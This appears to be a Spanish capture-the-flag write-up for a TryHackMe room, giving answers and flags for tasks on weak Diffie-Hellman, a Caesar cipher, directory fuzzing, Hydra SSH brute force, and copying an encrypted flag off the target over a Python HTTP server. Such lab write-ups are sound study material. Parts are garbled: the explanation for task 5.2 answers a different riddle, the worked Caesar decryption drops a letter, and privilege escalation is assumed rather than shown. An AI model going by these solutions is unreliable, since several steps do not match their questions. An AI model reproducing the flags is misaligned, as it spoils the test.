Si vas a Google, y buscas los el Severity and Vector Strings de POODLE, encontraremos la respuesta.

**✅ RESPUESTA:**
```bash
 8,6
```

-------------
### 4.5. Uso de parámetros Diffie-Hellman de menor seguridad (por ejemplo, claves de 512 o 1024 bits compartidas entre muchos servidores). ¿Cuál es el length? ###

¿Qué indica el valor "1024" en este contexto?
1024 bits es la longitud del grupo DH (clave) utilizado para el intercambio de claves.

En el contexto de ciberseguridad y pruebas como TryHackMe, cuando te preguntan algo como:

"Uso de parámetros Diffie-Hellman de menor seguridad (por ejemplo, claves de 512 o 1024 bits compartidas entre muchos servidores). ¿Cuál es el length?"

Están poniendo a prueba tu conocimiento sobre qué longitudes de claves ya no son consideradas seguras.

De hecho, 1024 bits es el tamaño comúnmente mencionado en vulnerabilidades como Logjam, donde muchos servidores usaban parámetros DH de 1024 bits compartidos, lo que permitía precomputar y romper el cifrado.

🧠 Entonces, en resumen:
La longitud 1024 es la que aún se encuentra en muchos servidores, pero no es suficientemente segura hoy en día.

Es la respuesta correcta al reto porque es el valor inseguro que se busca identificar.

**✅ RESPUESTA:**
```bash
 1024
```
-------------
### TASK 5 

### 5.1. "Dicen que Lucy dejó su nombre escondido con un giro en el abecedario… ¿podrás traerla de vuelta desde 'oxfbyhjdv1234'?" ###

Este acertijo parece estar relacionado con un tipo de cifrado en el que el texto original se ha transformado utilizando un desplazamiento en el alfabeto, lo que es un claro indicio de un Cifrado César o alguna variante similar. El nombre "Lucy" está escondido con un giro en el abecedario, lo que implica que necesitamos descifrar el texto "oxfbyhjdv1234" para revelar el verdadero mensaje.

**Desglose:**
"Dicen que Lucy dejó su nombre escondido con un giro en el abecedario…"
Esto nos sugiere que el texto original fue cifrado utilizando un desplazamiento en el alfabeto. Es posible que se haya utilizado un Cifrado César, donde cada letra se desplaza un número determinado de lugares en el alfabeto.

**"¿Podrás traerla de vuelta desde 'oxfbyhjdv1234'?"**
Aquí nos piden que tomemos el texto cifrado "oxfbyhjdv1234" y lo deshagamos utilizando el mismo tipo de cifrado.

Pasos para resolver el acertijo:
1. Cifrado César:
El Cifrado César es uno de los más sencillos. Cada letra del texto se mueve un número fijo de posiciones en el alfabeto.

El nombre "Lucy" y el texto cifrado nos sugieren que el desplazamiento es en alguna dirección, probablemente hacia atrás.

2. Aplicar un desplazamiento:
Si probamos un desplazamiento hacia atrás, comenzando con una rotación de 1, 2 o 3 caracteres, podríamos descifrar el mensaje.

3. Usar una herramienta:
Puedes usar herramientas en línea para descifrarlo, o hacerlo manualmente. Por ejemplo, un desplazamiento de 3 caracteres hacia atrás podría producir el texto descifrado.

Ejemplo de solución (usando un desplazamiento de 3):
Si hacemos un desplazamiento hacia atrás de 3 letras en el alfabeto para el texto "oxfbyhjdv1234", obtenemos lo siguiente:

o → l

x → u

f → c

b → y

y → v

h → e

j → g

d → a

v → s

El texto descifrado sería: "lucyegas1234"

Por lo tanto, podemos intuir que el usuario es lucy.

**✅ RESPUESTA:**
```bash
 lucy
```
-------------
### 5.2. ¿En qué página personal o red profesional podríamos encontrar más información detallada sobre "TheServerSharkers" o sus miembros? ###

El acertijo plantea un desafío en el que se debe encontrar rutas o paneles ocultos en un sistema, sugiriendo que las “puertas” (páginas o directorios) no son visibles de manera obvia y que las rutas podrían estar ocultas.

**Desglose del acertijo:**
"Si las puertas no están a la vista y los muros no muestran entradas claras..."

Aquí se hace referencia a la necesidad de encontrar rutas ocultas en un servidor web. Las “puertas” son accesos directos o páginas que no están fácilmente visibles o enlazadas desde el sitio principal.

**"...¿qué comando te ayudaría a encontrar aquellas rutas ocultas, donde quizá se esconde un panel de acceso?"**

Esto nos invita a pensar en una herramienta que permita escanear y encontrar estos "accesos ocultos" o rutas no indexadas, lo que comúnmente se hace con herramientas de fuzzing o de escaneo de directorios.

**Interpretación y solución:**
En el contexto de un servidor web y la necesidad de encontrar rutas ocultas, el comando más adecuado podría ser una herramienta como Gobuster, Dirb o Dirbuster, que están diseñadas específicamente para buscar directorios y archivos en servidores web, a menudo ocultos o no enlazados directamente.

 * Gobuster: Usada para hacer un fuzzing de directorios en una URL dada.

 * Dirb: Similar, con una lista de palabras para intentar acceder a diferentes rutas.

 * Dirbuster: Otra herramienta de fuzzing de directorios que también ayuda a identificar entradas ocultas.

**¿Por qué “windows.php”?**
El archivo "windows.php" mencionado en el acertijo podría ser una pista hacia un panel de administración o una página oculta que usa un nombre genérico, como "windows", para despistar o disfrazar su propósito. Podría tratarse de un archivo específico de configuración o administración de un sistema web que tiene un nombre común o engañoso, y que debe ser encontrado al hacer fuzzing o exploración.

**✅ RESPUESTA:**
```bash
  windows.php
```

-------------
### 5.3. “Entre los bytes y los susurros digitales, Lucy dejó algo atrás... ¿Puedes encontrar su huella y revelar la flag que lleva su nombre?” ###

Con la información anterior de windows.php, utulizamos esta direccion y se la añadimos al otro host que tenemos en /etc/host. Deberia quedar algo asi:

```bash
 ab.theserversharkers.io/windows.php
```

<img width="1710" alt="Captura de pantalla 2025-05-03 a las 14 19 06" src="https://github.com/user-attachments/assets/8c270406-a7e6-4e8a-83c8-3b4baaa340cf" />

**✅ RESPUESTA:**
```bash
  THM{jUoPPPK54647HJG12LHJH90khK} 
```

-------------
### 5.4. "Dicen hydra, que 'paco' nunca cerraba la puerta... pero esta vez sí lo hizo. ¿Y si alguien supiera por dónde buscar entre rutas olvidadas y probarlas una a una contra la terminal del ssh?" ###

Texto del acertijo:
"Dicen hydra, que 'paco' nunca cerraba la puerta..."

Aquí ya hay una mención directa de “hydra”, lo cual es una pista explícita y poco común en acertijos. Esto sugiere claramente que la herramienta hydra es central en la solución.

“Nunca cerraba la puerta” insinúa que solía tener un acceso abierto (sin contraseña, o contraseña débil).

"...pero esta vez sí lo hizo."

Significa que ya no está abierto, hay una contraseña protegida.

Necesitas descubrir esa contraseña.

"¿Y si alguien supiera por dónde buscar entre rutas olvidadas y probarlas una a una contra la terminal del ssh?"

La frase "probarlas una a una" es sinónimo de ataque por diccionario o fuerza bruta.

"terminal del ssh" apunta al protocolo SSH, lo que indica que la autenticación fallida será contra este servicio.

🔎 Conexión lógica:
Clave del acertijo	Significado técnico
“Hydra”	Nombre directo de la herramienta de fuerza bruta.

**✅ RESPUESTA:**
```bash
 hydra 
```
-------------
### 5.5. "Pero algo no encaja... los planos hablan de una segunda cámara, más profunda, protegida no por muros, sino por mentes. Las rutas están cifradas, las llaves... escondidas entre los registros. Una palabra quedó al final del archivo: 'CIPHER98'. ¿Estás listo para descender otro nivel en la madriguera?"###

Acceso inicial vía SSH
**Paso 1: Conexión SSH al servidor**
```bash
ssh paco@IP_MAQUINA_THM
```
Se utilizó el usuario paco para conectarse a la IP 10.10.32.157.

Al establecer la conexión, el sistema muestra un banner con advertencias legales y el nombre del servidor: The Server Sharkers.

Esto indica que has accedido correctamente a la máquina como el usuario paco.

**Paso 2: Enumeración del sistema**
Se identificó que había un archivo importante en el sistema ubicado en el directorio /home/director/ llamado:
flag.txt.gpg (archivo cifrado con GPG).

Desde el contexto de root (probablemente se haya escalado privilegios antes de este paso), se accedió a esa ruta.

**Paso 3: Levantar servidor HTTP para transferencia de archivo**
```bash
python3 -m http.server 9000
```

Desde la cuenta root, se utilizó python3 para iniciar un servidor HTTP simple en el puerto 9000.

Esto expone los archivos del directorio actual (/home/director) a través de HTTP, permitiendo descargarlos fácilmente desde otra máquina.

**Paso 4: Descargar el archivo flag.txt.gpg**

En la segunda imagen se puede ver que alguien accede desde la IP 10.23.78.166 y descarga el archivo usando HTTP:
```bash
"GET /flag.txt.gpg HTTP/1.1" 200
```

Esto confirma que el archivo fue descargado correctamente a través del puerto 9000.

**✅ RESPUESTA:**
```bash
 THM{FACIL_PERO_ NO_ ES_}
```
